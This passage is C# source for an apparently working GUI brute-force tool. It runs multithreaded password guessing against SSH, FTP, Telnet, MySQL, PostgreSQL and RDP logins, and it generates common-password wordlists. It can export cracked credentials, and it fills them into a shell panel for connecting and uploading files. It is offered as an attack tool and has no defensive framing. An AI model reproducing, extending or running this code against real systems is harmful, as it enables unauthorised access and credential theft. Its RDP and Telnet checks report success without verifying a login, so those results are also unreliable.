                            AppendToShell($"Error: {interimResponse.Trim()}\r\n");
                            dataClient.Close();
                            return;
                        }
                    }

                    using (dataClient)
                    using (var dataStream = dataClient.GetStream())
                    using (var fileStream = File.OpenRead(openDialog.FileName))
                    {
                        await fileStream.CopyToAsync(dataStream);
                    }

                    string response = await ReadFTPResponse();
                    AppendToShell($"✓ Uploaded: {remoteFilename}\r\n");
                }
                catch (Exception ex)
                {
                    AppendToShell($"✗ Upload failed: {ex.Message}\r\n");
                }
                finally
                {
                    dataClient?.Close();
                }
            }
        }

        private void DisconnectShellBtn_Click(object sender, RoutedEventArgs e)
        {
            Disconnect();
        }

        private void Disconnect()
        {
            if (ftpKeepAliveCts != null)
            {
                ftpKeepAliveCts.Cancel();
                ftpKeepAliveCts.Dispose();
                ftpKeepAliveCts = null;
            }

            if (outputReaderTimer != null)
            {
                outputReaderTimer.Stop();
                outputReaderTimer.Dispose();
                outputReaderTimer = null;
            }

            try
            {
                if (activeShellStream != null)
                {
                    activeShellStream.Close();
                    activeShellStream = null;
                }

                if (activeSshClient != null)
                {
                    activeSshClient.Disconnect();
                    activeSshClient.Dispose();
                    activeSshClient = null;
                }

                if (activeStreamWriter != null)
                {
                    activeStreamWriter.Close();
                    activeStreamWriter = null;
                }

                if (activeStreamReader != null)
                {
                    activeStreamReader.Close();
                    activeStreamReader = null;
                }

                if (activeStream != null)
                {
                    activeStream.Close();
                    activeStream = null;
                }

                if (activeTcpClient != null)
                {
                    activeTcpClient.Close();
                    activeTcpClient = null;
                }
            }
            catch { }

            isConnected = false;
            ConnectShellBtn.IsEnabled = true;
            DisconnectShellBtn.IsEnabled = false;
            ShellInputBox.IsEnabled = false;
            SendCommandBtn.IsEnabled = false;
            currentDirectory = "/";

            AppendToShell("\r\n--- Disconnected ---\r\n");
        }

        private async void StartAttackBtn_Click(object sender, RoutedEventArgs e)
        {
            if (isRunning)
            {
                MessageBox.Show("Attack is already running!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            string target = TargetInput.Text.Trim();
            if (!int.TryParse(PortInput.Text, out int port))
            {
                MessageBox.Show("Please enter a valid port!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (usernames.Count == 0 || passwords.Count == 0)
            {
                MessageBox.Show("Please load usernames and passwords!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            Dispatcher.Invoke(() =>
            {
                bruteResults.Clear();
                foundCredentials.Clear();
                ResultsItemsControl.Items.Clear();
                CredentialsItemsControl.Items.Clear();
                totalAttempts = 0;
                successfulAttempts = 0;
                failedAttempts = 0;
                threadSafeTotalAttempts = 0;
                threadSafeSuccessfulAttempts = 0;
                threadSafeFailedAttempts = 0;
                currentUsernameIndex = 0;
                currentPasswordIndex = 0;
                UpdateProgress();
            });

            isRunning = true;
            startTime = DateTime.Now;
            cts = new CancellationTokenSource();

            Dispatcher.Invoke(() =>
            {
                StartAttackBtn.IsEnabled = false;
                StopAttackBtn.IsEnabled = true;
                StatusLed.Fill = Brushes.Yellow;
                StatusText.Text = "RUNNING";
                AddResult($"Starting brute force attack on {target}:{port}", Brushes.Orange);
            });

            try
            {
                if (!int.TryParse(ThreadsInput.Text, out int maxThreads) || maxThreads < 1) maxThreads = 10;
                if (!int.TryParse(TimeoutInput.Text, out int timeout) || timeout < 100) timeout = 5000;
                bool stopOnSuccess = StopOnSuccessCheck.IsChecked ?? true;

                string selectedProtocol = ProtocolCombo.SelectedIndex >= 0 ?
                    ((ComboBoxItem)ProtocolCombo.SelectedItem).Content.ToString().Split(' ')[0] : "SSH";

                await Task.Run(() => RunBruteForce(target, port, maxThreads, timeout, stopOnSuccess, selectedProtocol, cts.Token));
            }
            catch (OperationCanceledException)
            {
                Dispatcher.Invoke(() => AddResult("Attack cancelled by user", Brushes.Yellow));
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AddResult($"Attack error: {ex.Message}", Brushes.Red));
            }
            finally
            {
                isRunning = false;
                Dispatcher.Invoke(() =>
                {
                    StartAttackBtn.IsEnabled = true;
                    StopAttackBtn.IsEnabled = false;
                    StatusLed.Fill = Brushes.Green;
                    StatusText.Text = "COMPLETED";
                    AddResult($"Attack completed. Total attempts: {totalAttempts}, Found: {successfulAttempts}", Brushes.LightGreen);
                });
            }
        }

        private void RunBruteForce(string target, int port, int maxThreads, int timeout, bool stopOnSuccess, string protocol, CancellationToken token)
        {
            var tasks = new List<Task>();
            var semaphore = new SemaphoreSlim(maxThreads);

            for (int i = 0; i < maxThreads; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (!token.IsCancellationRequested)
                    {
                        string username = "";
                        string password = "";

                        lock (this)
                        {
                            if (currentUsernameIndex >= usernames.Count) break;
                            username = usernames[currentUsernameIndex];
                            password = passwords[currentPasswordIndex];
                            currentPasswordIndex++;
                            if (currentPasswordIndex >= passwords.Count)
                            {
                                currentPasswordIndex = 0;
                                currentUsernameIndex++;
                            }
                            Interlocked.Increment(ref threadSafeTotalAttempts);
                        }

                        if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)) break;

                        await semaphore.WaitAsync(token);
                        try
                        {
                            Dispatcher.Invoke(() =>
                            {
                                CurrentUserText.Text = username;
                                CurrentPassText.Text = new string('*', password.Length);
                                UpdateProgress();
                            });

                            bool success = await TestCredentialAsync(target, port, username, password, timeout, protocol);

                            if (success)
                            {
                                Interlocked.Increment(ref threadSafeSuccessfulAttempts);

                                Dispatcher.Invoke(() =>
                                {
                                    AddResult($"[SUCCESS] {username}:{password}", Brushes.LightGreen);
                                    var credential = new FoundCredential
                                    {
                                        Service = protocol,
                                        Username = username,
                                        Password = password,
                                        Target = target,
                                        Port = port,
                                        Timestamp = DateTime.Now.ToString("HH:mm:ss")
                                    };
                                    foundCredentials.Add(credential);
                                    AddCredentialToUI(credential);

                                    ShellTargetInput.Text = target;
                                    ShellPortInput.Text = port.ToString();
                                    ShellUsernameInput.Text = username;
                                    ShellPasswordInput.Text = password;

                                    if (stopOnSuccess)
                                    {
                                        cts.Cancel();
                                    }
                                });
                            }
                            else
                            {
                                Interlocked.Increment(ref threadSafeFailedAttempts);
                            }
                        }
                        finally
                        {
                            semaphore.Release();
                        }

                        if (token.IsCancellationRequested) break;
                    }
                }, token));
            }

            try
            {
                Task.WaitAll(tasks.ToArray(), token);
            }
            catch (OperationCanceledException) { }
        }

        private async Task<bool> TestCredentialAsync(string target, int port, string username, string password, int timeout, string protocol)
        {
            try
            {
                return protocol.ToUpper() switch
                {
                    "SSH" => await TestSSH(target, port, username, password, timeout),
                    "FTP" => await TestFTP(target, port, username, password, timeout),
                    "TELNET" => await TestTelnet(target, port, username, password, timeout),
                    "MYSQL" => await TestMySQL(target, port, username, password, timeout),
                    "POSTGRESQL" => await TestPostgreSQL(target, port, username, password, timeout),
                    "RDP" => await TestRDP(target, port, username, password, timeout),
                    _ => false
                };
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestSSH(string target, int port, string username, string password, int timeout)
        {
            try
            {
                using (var client = new SshClient(target, port, username, password))
                {
                    client.ConnectionInfo.Timeout = TimeSpan.FromMilliseconds(timeout);
                    client.Connect();
                    bool connected = client.IsConnected;
                    client.Disconnect();
                    return connected;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestFTP(string target, int port, string username, string password, int timeout)
        {
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create($"ftp://{target}:{port}/");
                request.Method = WebRequestMethods.Ftp.ListDirectory;
                request.Credentials = new NetworkCredential(username, password);
                request.Timeout = timeout;
                using (FtpWebResponse response = (FtpWebResponse)await request.GetResponseAsync())
                {
                    return response.StatusCode == FtpStatusCode.OpeningData ||
                           response.StatusCode == FtpStatusCode.DataAlreadyOpen;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestTelnet(string target, int port, string username, string password, int timeout)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var connectTask = client.ConnectAsync(target, port);
                    if (await Task.WhenAny(connectTask, Task.Delay(timeout)) != connectTask)
                    {
                        return false;
                    }

                    using (var stream = client.GetStream())
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                        if (response.Contains("login:") || response.Contains("Login:"))
                        {
                            string loginCmd = username + "\r\n";
                            byte[] loginBytes = Encoding.ASCII.GetBytes(loginCmd);
                            await stream.WriteAsync(loginBytes, 0, loginBytes.Length);

                            await Task.Delay(500);
                            bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                            response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                            if (response.Contains("password:") || response.Contains("Password:"))
                            {
                                string passCmd = password + "\r\n";
                                byte[] passBytes = Encoding.ASCII.GetBytes(passCmd);
                                await stream.WriteAsync(passBytes, 0, passBytes.Length);

                                await Task.Delay(1000);
                                return true;
                            }
                        }
                        return false;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestMySQL(string target, int port, string username, string password, int timeout)
        {
            try
            {
                string connectionString = $"Server={target};Port={port};Uid={username};Pwd={password};Connect Timeout={timeout / 1000};";
                using (var connection = new MySqlConnection(connectionString))
                {
                    await connection.OpenAsync();
                    return connection.State == System.Data.ConnectionState.Open;
                }
            }
            catch (MySqlException ex) when (ex.Number == 1045)
            {
                return false;
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestPostgreSQL(string target, int port, string username, string password, int timeout)
        {
            try
            {
                string connectionString = $"Host={target};Port={port};Username={username};Password={password};Timeout={timeout / 1000};";
                using (var connection = new NpgsqlConnection(connectionString))
                {
                    await connection.OpenAsync();
                    return connection.State == System.Data.ConnectionState.Open;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> TestRDP(string target, int port, string username, string password, int timeout)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var connectTask = client.ConnectAsync(target, port);
                    if (await Task.WhenAny(connectTask, Task.Delay(timeout)) == connectTask && client.Connected)
                    {
                        return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private void AddResult(string text, SolidColorBrush color)
        {
            try
            {
                var result = new BruteResult
                {
                    Text = $"[{DateTime.Now:HH:mm:ss}] {text}",
                    Color = color
                };

                var border = new Border
                {
                    Background = new SolidColorBrush(Color.FromArgb(20, color.Color.R, color.Color.G, color.Color.B)),
                    Padding = new Thickness(10, 6, 10, 6),
                    Margin = new Thickness(0, 0, 0, 2),
                    CornerRadius = new CornerRadius(3)
                };

                var textBlock = new TextBlock
                {
                    Text = result.Text,
                    Foreground = color,
                    FontFamily = new FontFamily("Consolas"),
                    FontSize = 11,
                    TextWrapping = TextWrapping.Wrap
                };

                border.Child = textBlock;
                ResultsItemsControl.Items.Add(border);

                var scrollViewer = FindVisualChild<ScrollViewer>(ResultsItemsControl);
                scrollViewer?.ScrollToEnd();
            }
            catch { }
        }

        private void AddCredentialToUI(FoundCredential credential)
        {
            try
            {
                var border = new Border
                {
                    Background = new SolidColorBrush(Color.FromArgb(40, 0, 200, 0)),
                    BorderBrush = Brushes.DarkGreen,
                    BorderThickness = new Thickness(0, 0, 0, 1),
                    Padding = new Thickness(12, 8, 12, 8),
                    Margin = new Thickness(0, 0, 0, 2),
                    Cursor = Cursors.Hand,
                    ToolTip = "Double-click to load in shell panel"
                };

                border.MouseLeftButtonDown += (s, e) =>
                {
                    if (e.ClickCount == 2)
                    {
                        ShellTargetInput.Text = credential.Target;
                        ShellPortInput.Text = credential.Port.ToString();
                        ShellUsernameInput.Text = credential.Username;
                        ShellPasswordInput.Text = credential.Password;

                        foreach (ComboBoxItem item in ShellProtocolCombo.Items)
                        {
                            if (item.Content.ToString() == credential.Service)
                            {
                                ShellProtocolCombo.SelectedItem = item;
                                break;
                            }
                        }

                        e.Handled = true;
                    }
                };

                var grid = new Grid();
                grid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(70) });
                grid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(100) });
                grid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
                grid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
                grid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });

                var serviceText = new TextBlock { Text = credential.Service, Foreground = Brushes.Orange, FontWeight = FontWeights.Bold, FontSize = 11 };
                var targetText = new TextBlock { Text = credential.Target, Foreground = Brushes.Cyan, FontSize = 11 };
                var userText = new TextBlock { Text = credential.Username, Foreground = Brushes.White, FontWeight = FontWeights.Bold, FontSize = 11 };
                var passText = new TextBlock { Text = credential.Password, Foreground = Brushes.LightGreen, FontWeight = FontWeights.Bold, FontSize = 11 };
                var timeText = new TextBlock { Text = credential.Timestamp, Foreground = Brushes.Gray, FontSize = 10 };

                Grid.SetColumn(serviceText, 0);
                Grid.SetColumn(targetText, 1);
                Grid.SetColumn(userText, 2);
                Grid.SetColumn(passText, 3);
                Grid.SetColumn(timeText, 4);

                grid.Children.Add(serviceText);
                grid.Children.Add(targetText);
                grid.Children.Add(userText);
                grid.Children.Add(passText);
                grid.Children.Add(timeText);

                border.Child = grid;
                CredentialsItemsControl.Items.Add(border);
            }
            catch { }
        }

        private T FindVisualChild<T>(DependencyObject parent) where T : DependencyObject
        {
            for (int i = 0; i < VisualTreeHelper.GetChildrenCount(parent); i++)
            {
                var child = VisualTreeHelper.GetChild(parent, i);
                if (child is T result) return result;
                var childResult = FindVisualChild<T>(child);
                if (childResult != null) return childResult;
            }
            return null;
        }

        private void UpdateProgress()
        {
            try
            {
                int totalCombinations = usernames.Count * passwords.Count;
                if (totalCombinations > 0)
                {
                    double progress = (double)totalAttempts / totalCombinations * 100;
                    ProgressBar.Value = progress;
                    ProgressText.Text = $"{progress:F1}%";
                    AttemptsText.Text = totalAttempts.ToString();
                }

                if (totalAttempts > 0)
                {
                    double successRate = (double)successfulAttempts / totalAttempts * 100;
                    SuccessRateText.Text = $"{successRate:F1}%";
                }
            }
            catch { }
        }

        private void StopAttackBtn_Click(object sender, RoutedEventArgs e)
        {
            if (isRunning && cts != null)
            {
                cts.Cancel();
                AddResult("Stopping attack...", Brushes.Yellow);
            }
        }

        private void BrowseUsernameBtn_Click(object sender, RoutedEventArgs e)
        {
            string input = UsernameInput.Text.Trim();
            if (!string.IsNullOrEmpty(input))
            {
                usernames = input.Split(new[] { ',', ';', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(u => u.Trim())
                    .Distinct()
                    .ToList();
                UpdateCounts();
                AddResult($"Loaded {usernames.Count} usernames from input", Brushes.Green);
            }
        }

        private void BrowsePasswordBtn_Click(object sender, RoutedEventArgs e)
        {
            string input = PasswordInput.Text.Trim();
            if (!string.IsNullOrEmpty(input))
            {
                passwords = input.Split(new[] { ',', ';', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries)
                    .Select(p => p.Trim())
                    .Distinct()
                    .ToList();
                UpdateCounts();
                AddResult($"Loaded {passwords.Count} passwords from input", Brushes.Green);
            }
        }

        private void LoadUsernameFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
                Title = "Select Username List"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    var lines = File.ReadAllLines(dialog.FileName);
                    usernames = lines.Where(l => !string.IsNullOrWhiteSpace(l))
                        .Select(l => l.Trim())
                        .Distinct()
                        .ToList();
                    UsernameFileInput.Text = Path.GetFileName(dialog.FileName);
                    UpdateCounts();
                    AddResult($"Loaded {usernames.Count} usernames from file", Brushes.Green);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading file: {ex.Message}");
                }
            }
        }

        private void LoadPasswordFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
                Title = "Select Password List"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    var lines = File.ReadAllLines(dialog.FileName);
                    passwords = lines.Where(l => !string.IsNullOrWhiteSpace(l))
                        .Select(l => l.Trim())
                        .Distinct()
                        .ToList();
                    PasswordFileInput.Text = Path.GetFileName(dialog.FileName);
                    UpdateCounts();
                    AddResult($"Loaded {passwords.Count} passwords from file", Brushes.Green);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading file: {ex.Message}");
                }
            }
        }

        private void GenerateWordlistBtn_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                passwords.Clear();
                var baseWords = new[] { "admin", "user", "test", "root", "guest", "password", "backup", "service" };
                var numbers = new[] { "", "123", "1234", "12345", "123456", "2023", "2024", "2025" };
                var specials = new[] { "", "!", "@", "#", "$", "%" };
                var years = new[] { "2020", "2021", "2022", "2023", "2024" };

                foreach (var word in baseWords)
                {
                    foreach (var num in numbers)
                    {
                        foreach (var spec in specials)
                        {
                            passwords.Add(word + num + spec);
                            passwords.Add(char.ToUpper(word[0]) + word.Substring(1) + num + spec);
                        }
                    }
                }

                foreach (var year in years)
                {
                    passwords.Add("Password" + year);
                    passwords.Add("Admin" + year);
                    passwords.Add("Welcome" + year);
                }

                passwords = passwords.Distinct().Take(2000).ToList();
                UpdateCounts();
                AddResult($"Generated {passwords.Count} passwords", Brushes.Green);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error generating wordlist: {ex.Message}");
            }
        }

        private async void TestConnectionBtn_Click(object sender, RoutedEventArgs e)
        {
            string target = TargetInput.Text.Trim();
            string portText = PortInput.Text.Trim();

            if (string.IsNullOrEmpty(target) || !int.TryParse(portText, out int port))
            {
                MessageBox.Show("Please enter valid target and port!");
                return;
            }

            AddResult($"Testing connection to {target}:{port}...", Brushes.Orange);

            await Task.Run(async () =>
            {
                try
                {
                    using (var client = new TcpClient())
                    {
                        var connectTask = client.ConnectAsync(target, port);
                        if (await Task.WhenAny(connectTask, Task.Delay(3000)) == connectTask && client.Connected)
                        {
                            Dispatcher.Invoke(() => AddResult($"✓ Connection successful to {target}:{port}", Brushes.LightGreen));
                            client.Close();
                        }
                        else
                        {
                            Dispatcher.Invoke(() => AddResult($"✗ Port {port} is closed or filtered", Brushes.Red));
                        }
                    }
                }
                catch (Exception ex)
                {
                    Dispatcher.Invoke(() => AddResult($"✗ Connection error: {ex.Message}", Brushes.Red));
                }
            });
        }

        private void ClearResultsBtn_Click(object sender, RoutedEventArgs e)
        {
            bruteResults.Clear();
            ResultsItemsControl.Items.Clear();
            AddResult("Results cleared", Brushes.Gray);
        }

        private void ExportBtn_Click(object sender, RoutedEventArgs e)
        {
            if (foundCredentials.Count == 0)
            {
                MessageBox.Show("No credentials to export!");
                return;
            }

            var dialog = new SaveFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|CSV Files (*.csv)|*.csv|JSON Files (*.json)|*.json",
                Title = "Export Credentials",
                FileName = $"credentials_{DateTime.Now:yyyyMMdd_HHmmss}.txt"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    string extension = Path.GetExtension(dialog.FileName).ToLower();

                    if (extension == ".json")
                    {
                        var json = System.Text.Json.JsonSerializer.Serialize(foundCredentials,
                            new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
                        File.WriteAllText(dialog.FileName, json);
                    }
                    else if (extension == ".csv")
                    {
                        var lines = new List<string> { "Service,Target,Port,Username,Password,Timestamp" };
                        foreach (var cred in foundCredentials)
                        {
                            lines.Add($"{cred.Service},{cred.Target},{cred.Port},{cred.Username},{cred.Password},{cred.Timestamp}");
                        }
                        File.WriteAllLines(dialog.FileName, lines);
                    }
                    else
                    {
                        var lines = new List<string> { "=== FOUND CREDENTIALS ===" };
                        foreach (var cred in foundCredentials)
                        {
                            lines.Add($"[{cred.Timestamp}] {cred.Service}://{cred.Username}:{cred.Password}@{cred.Target}:{cred.Port}");
                        }
                        File.WriteAllLines(dialog.FileName, lines);
                    }

                    AddResult($"Exported {foundCredentials.Count} credentials to {Path.GetFileName(dialog.FileName)}", Brushes.Green);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error exporting: {ex.Message}");
                }
            }
        }

        private void CopyBtn_Click(object sender, RoutedEventArgs e)
        {
            if (foundCredentials.Count == 0)
            {
                MessageBox.Show("No credentials to copy!");
                return;
            }

            var sb = new StringBuilder();
            sb.AppendLine("Service\tTarget\tPort\tUsername\tPassword\tTimestamp");
            foreach (var cred in foundCredentials)
            {
                sb.AppendLine($"{cred.Service}\t{cred.Target}\t{cred.Port}\t{cred.Username}\t{cred.Password}\t{cred.Timestamp}");
            }
            Clipboard.SetText(sb.ToString());
            AddResult($"Copied {foundCredentials.Count} credentials to clipboard", Brushes.Green);
        }

        private void MinimizeBtn_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (isRunning && cts != null)
            {
                cts.Cancel();
            }
            Disconnect();
        }

        private void CloseBtn_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }
    }
}